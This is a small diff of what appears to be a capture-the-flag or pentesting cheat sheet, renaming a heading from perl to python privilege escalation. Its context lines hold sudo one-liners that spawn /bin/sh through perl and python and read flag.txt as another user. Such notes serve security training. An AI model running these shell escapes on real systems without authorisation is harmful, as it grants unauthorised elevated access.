@@ -58,7 +58,7 @@ Poratble Database
 #### sudo -u user perl -e 'exec "/bin/sh";'
 #### sudo -u user perl -e 'print `cat flag.txt`'
 
-### Privilege Escalation abusing perl
+### Privilege Escalation abusing python
 #### sudo -u user python -c 'import os; os.system("/bin/sh")'
 #### sudo -u python
 ###### import os
